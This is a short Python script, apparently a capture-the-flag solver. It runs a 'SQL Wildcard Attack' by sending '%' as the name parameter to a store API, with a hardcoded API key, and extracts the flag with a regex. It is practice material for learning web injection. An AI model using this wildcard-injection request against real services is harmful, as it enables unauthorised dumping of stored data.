import re
from init import login, domain, flag_pattern


store_url = domain + "api/store.php"
params = {"name": "%"}
headers = {"apikey": "2a4f3f52-e807-11ed-9a5f-0242ac110002"}


def wildcard():
    session = login()
    print("SQL Wildcard Attack ...")
    resp = session.get(store_url, params=params, headers=headers)
    flag = re.search(flag_pattern, resp.text).group(0)
    print(f"Flag Found!\n{flag}")
    session.close()


# wildcard()
